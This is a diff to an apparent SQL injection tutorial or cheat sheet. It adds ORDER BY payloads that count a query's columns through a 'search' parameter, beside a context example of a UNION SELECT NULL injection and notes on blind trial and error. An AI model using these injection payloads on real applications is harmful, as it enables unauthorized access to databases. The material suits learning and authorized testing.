@@ -59,6 +59,17 @@ Another example:
 > 1111' UNION SELECT NULL, NULL, NULL, NULL; -- -
 ```
 
+Other way to enumerate fields is to use ORDER BY:
+
+```text
+> search=Tom' ORDER BY 1-- -
+> search=Tom' ORDER BY 2-- -
+> search=Tom' ORDER BY 3-- -
+> search=Tom' ORDER BY 4-- -
+> search=Tom' ORDER BY 5-- -
+> search=Tom' ORDER BY 6-- -
+```
+
 For the query to work, the number of NULL fields must match, so we can just keep adding it until the app doesn't throw an error anymore, as the two statements finally will be balanced \(with the same number of fields in both SELECT statements\).
 
 This can be used even when the application does not throw an error when the query is wrong. Generally it will not display anything or the page will be messed up, so you can keep adding NULL to the query til it works.
